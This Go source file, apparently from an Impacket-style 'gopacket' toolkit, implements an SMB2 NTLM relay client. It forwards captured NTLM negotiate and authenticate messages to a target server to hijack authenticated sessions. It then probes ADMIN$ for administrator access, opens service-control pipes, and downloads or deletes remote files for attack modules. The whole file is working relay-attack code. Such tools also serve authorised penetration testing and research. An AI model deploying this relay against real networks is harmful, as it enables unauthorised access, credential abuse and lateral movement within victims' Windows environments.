// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Jacob Paullus

package relay

import (
	"encoding/binary"
	"fmt"
	"log"
	"net"

	"gopacket/internal/build"
	"gopacket/pkg/transport"
)

// SMBRelayClient manages the SMB2 connection to the target server.
// It uses raw SMB2 packets to avoid needing session signing keys.
// Implements the ProtocolClient interface.
type SMBRelayClient struct {
	TargetAddr string
	conn       net.Conn
	sessionID  uint64
	treeID     uint32
	messageID  uint64
}

// NewSMBRelayClient creates a new SMB relay client for the given target.
func NewSMBRelayClient(targetAddr string) *SMBRelayClient {
	return &SMBRelayClient{TargetAddr: targetAddr}
}

// InitConnection establishes a TCP connection and performs SMB2 NEGOTIATE.
// Implements ProtocolClient.
func (c *SMBRelayClient) InitConnection() error {
	conn, err := transport.Dial("tcp", c.TargetAddr)
	if err != nil {
		return fmt.Errorf("failed to connect to %s: %v", c.TargetAddr, err)
	}
	c.conn = conn
	c.messageID = 0

	// Send NEGOTIATE
	negReq := buildNegotiateRequest(c.messageID)
	c.messageID++

	if err := sendPacket(c.conn, negReq); err != nil {
		return fmt.Errorf("failed to send negotiate: %v", err)
	}

	// Receive NEGOTIATE response
	resp, err := recvPacket(c.conn)
	if err != nil {
		return fmt.Errorf("failed to receive negotiate response: %v", err)
	}

	hdr, err := parseSMB2Header(resp)
	if err != nil {
		return err
	}
	if hdr.Status != STATUS_SUCCESS {
		return fmt.Errorf("negotiate failed: status=0x%08x", hdr.Status)
	}

	dialect, _, err := parseNegotiateResponse(resp)
	if err != nil {
		return err
	}

	if build.Debug {
		log.Printf("[D] Relay client: negotiated dialect 0x%04x with %s", dialect, c.TargetAddr)
	}

	return nil
}

// SendNegotiate relays the NTLM Type1 negotiate and returns the Type2 challenge.
// Sends raw NTLM in SESSION_SETUP (no SPNEGO wrapping), matching Impacket relay behavior.
// Implements ProtocolClient.
func (c *SMBRelayClient) SendNegotiate(ntlmType1 []byte) ([]byte, error) {
	if build.Debug {
		log.Printf("[D] Relay client: sending raw NTLM Type1 (%d bytes) to target", len(ntlmType1))
	}

	// Build SESSION_SETUP request with raw NTLM (no SPNEGO wrapping)
	// Impacket relay sends raw NTLM directly in the SecurityBuffer
	pkt := buildSessionSetupRequest(c.messageID, 0, ntlmType1)
	c.messageID++

	if err := sendPacket(c.conn, pkt); err != nil {
		return nil, fmt.Errorf("failed to send session setup type1: %v", err)
	}

	// Receive response
	resp, err := recvPacket(c.conn)
	if err != nil {
		return nil, fmt.Errorf("failed to receive session setup response: %v", err)
	}

	status, sessionID, secBuf, err := parseSessionSetupResponse(resp)
	if err != nil {
		return nil, err
	}

	if status != STATUS_MORE_PROCESSING_REQUIRED {
		return nil, fmt.Errorf("expected STATUS_MORE_PROCESSING_REQUIRED, got 0x%08x", status)
	}

	c.sessionID = sessionID

	if build.Debug {
		log.Printf("[D] Relay client: got challenge from target, sessionID=0x%x", sessionID)
	}

	// Extract NTLM Type 2 from response
	// Target may respond with SPNEGO-wrapped or raw NTLM depending on what we sent
	type2, err := extractNTLMFromSecBuf(secBuf)
	if err != nil {
		return nil, fmt.Errorf("failed to extract Type2 from response: %v", err)
	}

	return type2, nil
}

// SendAuth relays the NTLM Type3 authenticate. Returns nil on success.
// Sends raw NTLM in SESSION_SETUP (no SPNEGO wrapping), matching Impacket relay behavior.
// Implements ProtocolClient.
func (c *SMBRelayClient) SendAuth(ntlmType3 []byte) error {
	if build.Debug {
		log.Printf("[D] Relay client: sending raw NTLM Type3 (%d bytes) to target", len(ntlmType3))
	}

	// Build SESSION_SETUP request with raw NTLM (no SPNEGO wrapping)
	pkt := buildSessionSetupRequest(c.messageID, c.sessionID, ntlmType3)
	c.messageID++

	if err := sendPacket(c.conn, pkt); err != nil {
		return fmt.Errorf("failed to send session setup type3: %v", err)
	}

	// Receive response
	resp, err := recvPacket(c.conn)
	if err != nil {
		return fmt.Errorf("failed to receive session setup auth response: %v", err)
	}

	status, _, secBuf, err := parseSessionSetupResponse(resp)
	if err != nil {
		return err
	}

	if build.Debug {
		log.Printf("[D] Relay client: auth response status=0x%08x, secBuf=%d bytes",
			status, len(secBuf))
	}

	// Accept both STATUS_SUCCESS and STATUS_MORE_PROCESSING_REQUIRED.
	// With raw NTLM (no SPNEGO), we typically get STATUS_SUCCESS.
	// STATUS_MORE_PROCESSING_REQUIRED may still occur — session is authenticated either way.
	if status != STATUS_SUCCESS && status != STATUS_MORE_PROCESSING_REQUIRED {
		return fmt.Errorf("authentication failed: status=0x%08x", status)
	}

	if build.Debug {
		log.Printf("[D] Relay client: authentication successful on target (status=0x%08x)", status)
	}

	return nil
}

// GetSession returns this client for use by attack modules.
// Implements ProtocolClient.
func (c *SMBRelayClient) GetSession() interface{} {
	return c
}

// KeepAlive sends a heartbeat to prevent session timeout.
// Implements ProtocolClient.
func (c *SMBRelayClient) KeepAlive() error {
	// Tree connect/disconnect IPC$
	if err := c.TreeConnect("IPC$"); err != nil {
		return err
	}
	return nil
}

// Kill terminates the connection.
// Implements ProtocolClient.
func (c *SMBRelayClient) Kill() {
	if c.conn != nil {
		c.conn.Close()
	}
}

// IsAdmin checks if the session has admin access by trying to open SCManager.
// Implements ProtocolClient.
func (c *SMBRelayClient) IsAdmin() bool {
	// Try to tree connect to ADMIN$
	err := c.TreeConnect("ADMIN$")
	return err == nil
}

// TreeConnect connects to a share on the target (e.g., IPC$)
func (c *SMBRelayClient) TreeConnect(share string) error {
	path := fmt.Sprintf("\\\\%s\\%s", stripPort(c.TargetAddr), share)
	pkt := buildTreeConnectRequest(c.messageID, c.sessionID, 0, path)
	c.messageID++

	if err := sendPacket(c.conn, pkt); err != nil {
		return fmt.Errorf("failed to send tree connect: %v", err)
	}

	resp, err := recvPacket(c.conn)
	if err != nil {
		return fmt.Errorf("failed to receive tree connect response: %v", err)
	}

	treeID, err := parseTreeConnectResponse(resp)
	if err != nil {
		return err
	}

	c.treeID = treeID

	if build.Debug {
		log.Printf("[D] Relay client: tree connected to %s, treeID=0x%x", share, treeID)
	}

	return nil
}

// CreatePipe opens a named pipe on the target (e.g., "srvsvc", "svcctl")
func (c *SMBRelayClient) CreatePipe(name string) ([16]byte, error) {
	pkt := buildCreateRequest(c.messageID, c.sessionID, c.treeID, name)
	c.messageID++

	if err := sendPacket(c.conn, pkt); err != nil {
		return [16]byte{}, fmt.Errorf("failed to send create: %v", err)
	}

	resp, err := recvPacket(c.conn)
	if err != nil {
		return [16]byte{}, fmt.Errorf("failed to receive create response: %v", err)
	}

	fileID, err := parseCreateResponse(resp)
	if err != nil {
		return [16]byte{}, err
	}

	if build.Debug {
		log.Printf("[D] Relay client: opened pipe %s, fileID=%x", name, fileID)
	}

	return fileID, nil
}

// Transact performs an IOCTL FSCTL_PIPE_TRANSCEIVE on the pipe
func (c *SMBRelayClient) Transact(fileID [16]byte, input []byte, maxOutput int) ([]byte, error) {
	pkt := buildIOCTLRequest(c.messageID, c.sessionID, c.treeID, fileID, input, uint32(maxOutput))
	c.messageID++

	if err := sendPacket(c.conn, pkt); err != nil {
		return nil, fmt.Errorf("failed to send ioctl: %v", err)
	}

	resp, err := recvPacket(c.conn)
	if err != nil {
		return nil, fmt.Errorf("failed to receive ioctl response: %v", err)
	}

	output, err := parseIOCTLResponse(resp)
	if err != nil {
		return nil, err
	}

	return output, nil
}

// ReadPipe reads data from the pipe
func (c *SMBRelayClient) ReadPipe(fileID [16]byte, length int) ([]byte, error) {
	pkt := buildReadRequest(c.messageID, c.sessionID, c.treeID, fileID, uint32(length))
	c.messageID++

	if err := sendPacket(c.conn, pkt); err != nil {
		return nil, fmt.Errorf("failed to send read: %v", err)
	}

	resp, err := recvPacket(c.conn)
	if err != nil {
		return nil, fmt.Errorf("failed to receive read response: %v", err)
	}

	// Handle STATUS_PENDING - server sent interim response, wait for actual response
	hdr, err := parseSMB2Header(resp)
	if err == nil && hdr.Status == STATUS_PENDING {
		if build.Debug {
			log.Printf("[D] Relay client: ReadPipe got STATUS_PENDING, waiting for actual response")
		}
		resp, err = recvPacket(c.conn)
		if err != nil {
			return nil, fmt.Errorf("failed to receive read response (after pending): %v", err)
		}
	}

	return parseReadResponse(resp)
}

// WritePipe writes data to the pipe
func (c *SMBRelayClient) WritePipe(fileID [16]byte, data []byte) error {
	pkt := buildWriteRequest(c.messageID, c.sessionID, c.treeID, fileID, data)
	c.messageID++

	if err := sendPacket(c.conn, pkt); err != nil {
		return fmt.Errorf("failed to send write: %v", err)
	}

	resp, err := recvPacket(c.conn)
	if err != nil {
		return fmt.Errorf("failed to receive write response: %v", err)
	}

	hdr, err := parseSMB2Header(resp)
	if err != nil {
		return err
	}
	if hdr.Status != STATUS_SUCCESS {
		return fmt.Errorf("write failed: status=0x%08x", hdr.Status)
	}

	return nil
}

// CreateFile opens a file for reading and returns the file handle and size
func (c *SMBRelayClient) CreateFile(path string) ([16]byte, uint64, error) {
	pkt := buildCreateFileReadRequest(c.messageID, c.sessionID, c.treeID, path)
	c.messageID++

	if err := sendPacket(c.conn, pkt); err != nil {
		return [16]byte{}, 0, fmt.Errorf("failed to send create file: %v", err)
	}

	resp, err := recvPacket(c.conn)
	if err != nil {
		return [16]byte{}, 0, fmt.Errorf("failed to receive create file response: %v", err)
	}

	fileID, fileSize, err := parseCreateResponseWithSize(resp)
	if err != nil {
		return [16]byte{}, 0, err
	}

	if build.Debug {
		log.Printf("[D] Relay client: opened file %s, fileID=%x, size=%d", path, fileID, fileSize)
	}

	return fileID, fileSize, nil
}

// ReadFileAt reads data from a file at a given offset
func (c *SMBRelayClient) ReadFileAt(fileID [16]byte, offset uint64, length uint32) ([]byte, error) {
	pkt := buildReadRequestAt(c.messageID, c.sessionID, c.treeID, fileID, length, offset)
	c.messageID++

	if err := sendPacket(c.conn, pkt); err != nil {
		return nil, fmt.Errorf("failed to send read: %v", err)
	}

	resp, err := recvPacket(c.conn)
	if err != nil {
		return nil, fmt.Errorf("failed to receive read response: %v", err)
	}

	// Handle STATUS_PENDING
	hdr, err := parseSMB2Header(resp)
	if err == nil && hdr.Status == STATUS_PENDING {
		resp, err = recvPacket(c.conn)
		if err != nil {
			return nil, fmt.Errorf("failed to receive read response (after pending): %v", err)
		}
	}

	return parseReadResponse(resp)
}

// DownloadFile reads an entire file by TreeConnecting to the share and reading in chunks
func (c *SMBRelayClient) DownloadFile(share, path string) ([]byte, error) {
	if err := c.TreeConnect(share); err != nil {
		return nil, fmt.Errorf("tree connect %s: %v", share, err)
	}

	fileID, fileSize, err := c.CreateFile(path)
	if err != nil {
		return nil, fmt.Errorf("create file %s: %v", path, err)
	}
	defer c.CloseFile(fileID)

	if build.Debug {
		log.Printf("[D] Relay client: downloading %s\\%s (%d bytes)", share, path, fileSize)
	}

	// Read in 64KB chunks
	const chunkSize = uint32(65536)
	var result []byte
	var offset uint64

	for offset < fileSize {
		readLen := chunkSize
		remaining := fileSize - offset
		if uint64(readLen) > remaining {
			readLen = uint32(remaining)
		}

		data, err := c.ReadFileAt(fileID, offset, readLen)
		if err != nil {
			return nil, fmt.Errorf("read at offset %d: %v", offset, err)
		}

		result = append(result, data...)
		offset += uint64(len(data))
	}

	return result, nil
}

// DeleteFile opens a file with DELETE_ON_CLOSE and closes it to delete
func (c *SMBRelayClient) DeleteFile(share, path string) error {
	if err := c.TreeConnect(share); err != nil {
		return fmt.Errorf("tree connect %s: %v", share, err)
	}

	pkt := buildCreateFileDeleteRequest(c.messageID, c.sessionID, c.treeID, path)
	c.messageID++

	if err := sendPacket(c.conn, pkt); err != nil {
		return fmt.Errorf("failed to send delete create: %v", err)
	}

	resp, err := recvPacket(c.conn)
	if err != nil {
		return fmt.Errorf("failed to receive delete create response: %v", err)
	}

	fileID, err := parseCreateResponse(resp)
	if err != nil {
		return fmt.Errorf("delete create failed: %v", err)
	}

	// Close the handle — DELETE_ON_CLOSE causes deletion
	return c.CloseFile(fileID)
}

// CloseFile closes a file handle (same protocol as ClosePipe)
func (c *SMBRelayClient) CloseFile(fileID [16]byte) error {
	return c.ClosePipe(fileID)
}

// ClosePipe closes a pipe handle
func (c *SMBRelayClient) ClosePipe(fileID [16]byte) error {
	pkt := buildCloseRequest(c.messageID, c.sessionID, c.treeID, fileID)
	c.messageID++

	if err := sendPacket(c.conn, pkt); err != nil {
		return fmt.Errorf("failed to send close: %v", err)
	}

	resp, err := recvPacket(c.conn)
	if err != nil {
		return fmt.Errorf("failed to receive close response: %v", err)
	}

	hdr, err := parseSMB2Header(resp)
	if err != nil {
		return err
	}
	if hdr.Status != STATUS_SUCCESS {
		return fmt.Errorf("close failed: status=0x%08x", hdr.Status)
	}

	return nil
}

// Close closes the TCP connection
func (c *SMBRelayClient) Close() error {
	if c.conn != nil {
		return c.conn.Close()
	}
	return nil
}

// stripPort removes the port from a host:port address
func stripPort(addr string) string {
	host, _, err := net.SplitHostPort(addr)
	if err != nil {
		return addr
	}
	return host
}

// extractNTLMFromSecBuf extracts the raw NTLM token from a SESSION_SETUP response
// security buffer. The target may respond with SPNEGO-wrapped or raw NTLM.
func extractNTLMFromSecBuf(secBuf []byte) ([]byte, error) {
	if len(secBuf) == 0 {
		return nil, fmt.Errorf("empty security buffer")
	}

	// Check if this is raw NTLM (starts with "NTLMSSP\0")
	if len(secBuf) >= 8 && string(secBuf[0:7]) == "NTLMSSP" {
		return secBuf, nil
	}

	// Check if this is a SPNEGO NegTokenResp (starts with 0xa1)
	if secBuf[0] == 0xa1 {
		type2, err := decodeNegTokenResp(secBuf)
		if err != nil {
			return nil, fmt.Errorf("SPNEGO decode failed: %v", err)
		}
		return type2, nil
	}

	// Check if this is a SPNEGO NegTokenInit (starts with 0x60)
	if secBuf[0] == 0x60 {
		type2, err := decodeNegTokenInit(secBuf)
		if err != nil {
			return nil, fmt.Errorf("SPNEGO init decode failed: %v", err)
		}
		return type2, nil
	}

	return nil, fmt.Errorf("unknown security buffer format (first byte: 0x%02x)", secBuf[0])
}

// extractNTLMType3Info extracts the user and domain from an NTLM Type 3 message
func extractNTLMType3Info(type3 []byte) (domain, user string) {
	// NTLM Type 3 structure:
	// Signature (8 bytes): "NTLMSSP\0"
	// MessageType (4 bytes): 3
	// LmChallengeResponseFields (8 bytes)
	// NtChallengeResponseFields (8 bytes)
	// DomainNameFields (8 bytes) at offset 28
	// UserNameFields (8 bytes) at offset 36
	// WorkstationFields (8 bytes) at offset 44
	// EncryptedRandomSessionKeyFields (8 bytes) at offset 52
	// NegotiateFlags (4 bytes) at offset 60
	if len(type3) < 64 {
		return "", ""
	}

	// Check NTLMSSP signature
	if string(type3[0:7]) != "NTLMSSP" {
		return "", ""
	}

	// Check NegotiateFlags at offset 60 for NTLMSSP_NEGOTIATE_UNICODE (bit 0).
	// If set, domain/username are UTF-16LE encoded; otherwise they are OEM (single-byte).
	flags := binary.LittleEndian.Uint32(type3[60:64])
	unicode := flags&ntlmsspNegotiateUnicode != 0

	// DomainName: Len(2) MaxLen(2) Offset(4) at offset 28
	domainLen := binary.LittleEndian.Uint16(type3[28:30])
	domainOffset := binary.LittleEndian.Uint32(type3[32:36])

	// UserName: Len(2) MaxLen(2) Offset(4) at offset 36
	userLen := binary.LittleEndian.Uint16(type3[36:38])
	userOffset := binary.LittleEndian.Uint32(type3[40:44])

	if int(domainOffset)+int(domainLen) <= len(type3) {
		raw := type3[domainOffset : domainOffset+uint32(domainLen)]
		if unicode {
			domain = decodeUTF16LE(raw)
		} else {
			domain = string(raw)
		}
	}
	if int(userOffset)+int(userLen) <= len(type3) {
		raw := type3[userOffset : userOffset+uint32(userLen)]
		if unicode {
			user = decodeUTF16LE(raw)
		} else {
			user = string(raw)
		}
	}

	return domain, user
}

// decodeUTF16LE decodes UTF-16LE bytes to a string
func decodeUTF16LE(b []byte) string {
	if len(b)%2 != 0 {
		b = b[:len(b)-1]
	}
	runes := make([]rune, len(b)/2)
	for i := range runes {
		runes[i] = rune(binary.LittleEndian.Uint16(b[i*2:]))
	}
	return string(runes)
}
